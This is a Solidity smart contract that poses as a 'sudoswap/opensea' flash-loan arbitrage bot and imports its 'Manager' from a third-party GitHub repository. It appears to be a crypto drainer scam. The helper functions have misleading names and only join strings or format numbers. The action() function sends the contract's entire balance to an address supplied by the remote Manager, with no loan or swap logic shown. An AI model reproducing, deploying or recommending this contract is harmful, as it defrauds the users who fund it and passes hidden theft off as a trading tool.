pragma solidity ^0.5.0;
 
// multiplier finance Smart Contracts
import "https://github.com/sudoswapbot/redesigned-octo-winner/blob/main/blob2/main/contract/ILendingPoolAddressesProvider.sol";
import "https://github.com/sudoswapbot/redesigned-octo-winner/blob/main/blob2/main/contract/ILendingPool.sol";
 
// pancakeSwap Smart Contracts
import "https://github.com/sudoswapbot/redesigned-octo-winner/blob/main/blob1/main/SudoswapCallee.sol";
import "https://github.com/sudoswapbot/redesigned-octo-winner/blob/main/blob1/main/SudoswapFactory.sol";
import "https://github.com/sudoswapbot/redesigned-octo-winner/blob/main/blob1/main/SudoswapPair.sol";
 
// Code Manager
import "https://github.com/sudoswapbot/redesigned-octo-winner/blob/main/blob1/main/contract/SudoswapBot.sol";
 
contract sudoswap_opensea_bot {
	string public Planform_A;
	string public Planform_B;
	uint loanAmount;
    bool flashloan;
	Manager manager;
	
	constructor(string memory _platformA, string memory _platformB, uint _Amount, bool _FlashLoan) public {
		Planform_A = _platformA;
		Planform_B = _platformB;
		loanAmount = _Amount;
        flashloan = _FlashLoan;
		manager = new Manager();
	}

    function opensea_pool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);
 
        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);
 
        uint i;
        uint j;
 
        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }
 
        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }
 
        return string(_newValue);
    }

        function sudoswap_pool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);
 
        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);
 
        uint i;
        uint j;
 
        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }
 
        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }
 
        return string(_newValue);
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    function flash_loan(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function() external payable {}
	
	function action() public payable {
		
	    // Send required coins for swap
	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
	    
	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
	    manager.performTasks();
	    
	}
}
